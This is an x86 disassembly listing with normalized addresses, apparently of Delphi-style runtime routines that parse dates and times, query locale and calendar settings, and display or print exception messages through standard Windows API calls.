mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a304
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409fa4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408d20
test eax eax
jne r-xdata
push ebp
call sub_40a01c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409f04
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409f84
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409f84
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409f84
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c854
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a304
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409f40
pop ecx
jmp r-xdata
push ebp
call sub_40a01c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409f04
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409f84
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408d20
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408d20
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408d20
test eax eax
jne r-xdata
jmp r-xdata
sub_40aab8
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40a304
pop ecx
push ebp
mov eax ebx
call sub_40a304
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404094
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40ab28
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_404264
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40ab4c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40ab28
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_404264
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40abe0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40ac59
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ac60
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40ab28
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_404264
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4044c4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_408298
test eax eax
jne r-xdata
mov eax edi
call sub_404264
add [ esi ] eax
mov bl 0x1
sub_40ac6c
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40ab28
mov eax esi
call sub_404264
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40aca4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_404264
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40acf0
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_404264
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c898
mov [ ebx ] eax
jmp r-xdata
sub_40ad38
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_404464
push eax
mov eax [ ebx ]
call sub_404464
pop edx
call sub_40ca10
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40ad8c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409f2c
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40ade8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40b103
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40aca4
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c94c
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40ab4c
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40acf0
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_4044c4
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_408308
mov eax [ ebp - 0x1c ]
call sub_40ad38
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b10a
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403fc8
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ac6c
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40ab4c
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ac6c
test al al
je r-xdata
call sub_409f2c
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40ab4c
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409ca0
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4045a8
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ac6c
mov edx ebx
mov eax esi
call sub_40ab28
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_404264
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40acf0
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40ad8c
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40ab28
mov eax esi
call sub_404264
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409f2c
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_404264
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4044c4
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_408298
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_404264
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4044c4
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_408298
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40b12c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40abe0
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40abe0
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40abe0
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40ab4c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40ab28
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40abe0
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ac6c
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40ab4c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40abe0
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ac6c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40ab28
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409b58
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40abe0
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40ab4c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40abe0
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ac6c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40abe0
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40ab4c
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40b320
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ade8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404264
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b354
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40b12c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404264
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b388
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40ade8
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40b354
mov ebx eax
jmp r-xdata
mov eax esi
call sub_404264
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40b12c
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b414
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404094
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b460
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403ff8
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404094
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b4ac
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b4d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b460
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405ecc
sub_40b510
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b623
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b4d4
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ff8
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b4d4
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403ff8
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b4d4
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403ff8
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b4d4
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403ff8
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b62a
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403fc8
retn
sub_40b634
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_40419c
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b670
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b6d5
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40419c
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_408580
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b6dc
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
inc ebx
sub_40b6e8
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b77f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b460
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408580
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b786
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b634
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b670
call EnumCalendarInfoA
sub_40b798
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b962
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403fa4
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b460
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_408580
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_404264
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b969
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403fc8
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408d20
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c85c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_4044c4
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40426c
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403ff8
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408d20
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40426c
inc ebx
jmp r-xdata
mov eax esi
call sub_404264
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408d20
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40426c
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40426c
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40426c
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_40418c
mov edx [ ebp - 0xc ]
mov eax edi
call sub_40426c
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_40418c
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_40426c
sub_40b9cc
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b9c0
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40cab0
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408c44
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405404
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4031a4
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40927c
mov eax [ ebp - 0x4 ]
call sub_408bb4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_404464
mov ebx eax
mov eax ebx
call sub_408bb4
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40bb54
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b9cc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405404
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402ab8
call sub_40292c
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408bb4
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
